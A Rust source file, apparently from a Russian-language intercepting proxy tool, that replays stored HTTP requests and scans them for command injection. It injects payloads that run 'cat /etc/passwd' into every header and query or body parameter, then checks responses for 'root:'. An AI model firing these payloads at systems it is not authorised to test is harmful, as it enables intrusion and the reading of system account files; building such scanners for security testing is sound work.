use async_std::prelude::*;
use futures::stream::{TryStreamExt};
use crate::cli::Config;
use crate::proxy::proxy_handler::handle::http_request::store_request;

pub async fn send_request(req: &str) {
    let req = parse_request(req.to_string()).await;
    let req = store_request(req).await;
    let client = hyper::Client::new();
    let resp = client.request(req).await.unwrap();
    println!("{:?}", resp);
    let body = resp.into_body();
    let entire_body = body
        .try_fold(Vec::new(), |mut data, chunk| async move {
            data.extend_from_slice(&chunk);
            Ok(data)
        })
        .await.unwrap();
    let body_string = String::from_utf8_lossy(&entire_body);
    println!("{}", body_string);
}
pub async fn parse_request(req: String) -> hyper::Request<hyper::Body> {
    let req = req.clone();
    let split_request = req.split("\r\n\r\n").collect::<Vec<&str>>();
    let before_body = split_request[0].split("\r\n").collect::<Vec<&str>>();
    let first_line_split = before_body[0].split(" ").collect::<Vec<&str>>();

    let method = first_line_split[0];
    let uri = first_line_split[1];
    let version = first_line_split[2];
    let version = match version {
        "HTTP/0.9" => http::version::Version::HTTP_09,
        "HTTP/1.0" => http::version::Version::HTTP_10,
        "HTTP/2.0" => http::version::Version::HTTP_2,
        "HTTP/3.0" => http::version::Version::HTTP_3,
        _ => http::version::Version::HTTP_11,
    };
    let body_string = if split_request.len() > 1 {
        split_request[1..].join("\r\n\r\n")
    } else {
        "".to_string()
    };
    let body = hyper::Body::from(body_string);

    let mut builder = hyper::Request::builder()
        .method(http::method::Method::from_bytes(method.as_bytes()).unwrap())
        .uri(uri.parse::<http::uri::Uri>().unwrap())
        .version(version);

    let mut skip = 0;

    for header in before_body.iter() {
        if skip == 0 {
            skip = 1;
            continue
        }
        let split_header = header.split(":").collect::<Vec<&str>>();
        builder = builder.header(
            http::header::HeaderName::from_bytes(split_header[0].as_bytes()).unwrap(),
            split_header[1].parse::<http::header::HeaderValue>().unwrap()
        );
    }
    builder.body(body).unwrap()
}
pub async fn scan_request(req_raw: &str) {

    let req = req_raw.clone();
    let split_request = req.split("\r\n\r\n").collect::<Vec<&str>>();
    let before_body = split_request[0].split("\r\n").collect::<Vec<&str>>();
    let body = if split_request.len() > 1 {
        split_request[1..].join("\r\n\r\n")
    } else {
        "".to_string()
    };
    let body = body.as_str();
    let mut curr = 1;

//    let mut requests: Vec<hyper::Request<hyper::Body>> = Vec::new();
    let mut requests = Vec::new();
    //scan headers
    for _header in before_body.iter() {

        if curr >= before_body.len() {
            break;
        }

        let mut before_body1 = before_body.clone();
        let mut before_body2 = before_body.clone();
        let mut before_body3 = before_body.clone();

        let new_h1 = &format!("{}{}",before_body[curr.clone()].clone(), ";cat /etc/passwd;");
        let new_h2 = &format!("{}{}",before_body[curr.clone()].clone(), "|cat /etc/passwd|");
        let new_h3 = &format!("{}{}",before_body[curr.clone()].clone(), "`cat /etc/passwd`");

        before_body1[curr.clone()] = new_h1;
        before_body2[curr.clone()] = new_h2;
        before_body3[curr.clone()] = new_h3;

        let req1 = format!("{}\r\n\r\n{}",before_body1.clone().join("\r\n"), body);
        let req2 = format!("{}\r\n\r\n{}",before_body2.clone().join("\r\n"), body);
        let req3 = format!("{}\r\n\r\n{}",before_body3.clone().join("\r\n"), body);

        requests.push(check_request(parse_request(req1).await, new_h1.clone()));
        requests.push(check_request(parse_request(req2).await, new_h2.clone()));
        requests.push(check_request(parse_request(req3).await, new_h3.clone()));

        curr +=1;
    }
    //scan query
    let first_line = before_body[0].split(" ").collect::<Vec<&str>>();

    let method = first_line[0];
    let uri = first_line[1];
    let version = first_line[2];

    let mut split_query = uri.split("?").collect::<Vec<&str>>();
    if method.to_uppercase() == "GET" {
        if split_query.len() > 1 {
            let uri_start = split_query[0];
            split_query.remove(0);
            let args = split_query.join("");
            let args = args.split("&").collect::<Vec<&str>>();

            let mut i = 0;
            for arg in args.iter() {

                if i >= args.len() {
                    break;
                }

                let mut before_body1 = before_body.clone();
                let mut before_body2 = before_body.clone();
                let mut before_body3 = before_body.clone();

                let mut args1 = args.clone();
                let mut args2 = args.clone();
                let mut args3 = args.clone();

                let new_a1 = &format!("{}{}",arg.clone(), ";cat /etc/passwd;");
                let new_a2 = &format!("{}{}",arg.clone(), "|cat /etc/passwd|");
                let new_a3 = &format!("{}{}",arg.clone(), "`cat /etc/passwd`");

                args1[i.clone()] = new_a1;
                args2[i.clone()] = new_a2;
                args3[i.clone()] = new_a3;

                let new_as1 = args1.join("&");
                let new_as2 = args2.join("&");
                let new_as3 = args3.join("&");

                let new_l1 = &format!("{} {}?{} {}", method, uri_start, new_as1, version);
                let new_l2 = &format!("{} {}?{} {}",method, uri_start, new_as2, version);
                let new_l3 = &format!("{} {}?{} {}",method, uri_start, new_as3, version);

                before_body1[0] = new_l1;
                before_body2[0] = new_l2;
                before_body3[0] = new_l3;

                let req1 = format!("{}\r\n\r\n{}",before_body1.clone().join("\r\n"), body);
                let req2 = format!("{}\r\n\r\n{}",before_body2.clone().join("\r\n"), body);
                let req3 = format!("{}\r\n\r\n{}",before_body3.clone().join("\r\n"), body);

                requests.push(check_request(parse_request(req1).await, new_a1.clone()));
                requests.push(check_request(parse_request(req2).await, new_a2.clone()));
                requests.push(check_request(parse_request(req3).await, new_a3.clone()));

                i +=1;
            }
        }
    } else if method.to_uppercase() == "POST" {

            let args = body.split("&").collect::<Vec<&str>>();
            println!("args: {:?}", args);

            let mut i = 0;
            for arg in args.iter() {

                if i >= args.len() {
                    break;
                }

                let mut args1 = args.clone();
                let mut args2 = args.clone();
                let mut args3 = args.clone();

                let new_a1 = &format!("{}{}",arg.clone(), ";cat /etc/passwd;");
                let new_a2 = &format!("{}{}",arg.clone(), "|cat /etc/passwd|");
                let new_a3 = &format!("{}{}",arg.clone(), "`cat /etc/passwd`");

                args1[i.clone()] = new_a1;
                args2[i.clone()] = new_a2;
                args3[i.clone()] = new_a3;

                let new_as1 = args1.join("&");
                let new_as2 = args2.join("&");
                let new_as3 = args3.join("&");

                let body1 = &new_as1;
                let body2 = &new_as2;
                let body3 = &new_as3;

                let req1 = format!("{}\r\n\r\n{}",split_request[0], body1);
                let req2 = format!("{}\r\n\r\n{}",split_request[0], body2);
                let req3 = format!("{}\r\n\r\n{}",split_request[0], body3);

                requests.push(check_request(parse_request(req1).await, new_a1.clone()));
                requests.push(check_request(parse_request(req2).await, new_a2.clone()));
                requests.push(check_request(parse_request(req3).await, new_a3.clone()));

                i +=1;
        }
    }

    use futures::prelude::*;
    let unpin_futs: Vec<_> = requests.into_iter().map(Box::pin).collect();
    let mut futs = unpin_futs;
    let num_of_checks = futs.len();
    let mut num_of_vulns = 0;
    while !futs.is_empty() {
        match future::select_all(futs).await {
            (Ok(val), _index, remaining) => {
                if val {
                    num_of_vulns += 1;
                }
                println!("Сделано {} проверок из {}",num_of_checks - remaining.len(), num_of_checks);
                futs = remaining;
            }
            (Err(e), _index, remaining) => {
                // Ignoring all errors
                println!("Ошибка во время сканирования: {}", e);
                futs = remaining;
            }
        }
    }
    if num_of_vulns > 0 {
        println!("Найдено {} уязвимостей", num_of_vulns);
    } else {
        println!("Уязвимостей не обнаружено");
    }
}
async fn check_request(req: hyper::Request<hyper::Body>, param_name: String) -> std::io::Result<bool> {
//    let req = parse_request(req.to_string()).await;
//    let req = store_request(req).await;
    let method = format!("{}", req.method());
    let uri = format!("{}", req.uri());
    let client = hyper::Client::new();
    let resp = client.request(req).await.unwrap();
    //@TODO сохранить в строку тело и проверить наличие  root
    let response_body = resp.into_body()
        .try_fold(Vec::new(), |mut data, chunk| async move {
            data.extend_from_slice(&chunk);
            Ok(data)
        })
        .await.unwrap();
    let body_string = String::from_utf8_lossy(&response_body);
    if body_string.contains("root:") {
        println!("{} {} запрос имеет уязвимый к Command injection параметр: {}", method, uri, param_name);
        Ok(true)
    } else {
        Ok(false)
    }
}
pub async fn print_request(req: &str) {
    println!("{}",req);
}

pub async fn load_request(id: &str) -> std::io::Result<String> {

    let mut entries = async_std::fs::read_dir("./requests").await?;

    while let Some(res) = entries.next().await {
        let entry = res?;

        let file_name = entry.file_name();
        let file_name = file_name.to_string_lossy();

        if file_name.starts_with(id) {
            return async_std::fs::read_to_string(&format!("./requests/{}", file_name)).await;
        }
    }
    use std::io::{Error, ErrorKind};
    Err(Error::new(ErrorKind::Other, "Файл не найден"))
}
pub async fn show_request(line: &str, _config: &mut Config) -> std::io::Result<()> {
    let split_line = line.split(" ").collect::<Vec<&str>>();
    if split_line.len() >= 2 {
        let id = split_line[1];
        let req = match load_request(id).await {
            Ok(v) => v,
            Err(e) => {
                println!("Не удалось найти запрос.");
                return Err(e)
            }
        };
        if split_line.len() == 3 && split_line[2] == "scan" {
            scan_request(&req).await;
        } else if split_line.len() == 3 && split_line[2] == "send" {
            send_request(&req).await;
        } else {
            print_request(&req).await;
        }
    } else {
        println!(
r"===============================================================================
request <id> – показать подробную информацию о запросе
    scan – проверить запрос на уязвимость
    send - повторно отправить запрос
===============================================================================");
    }
    Ok(())
}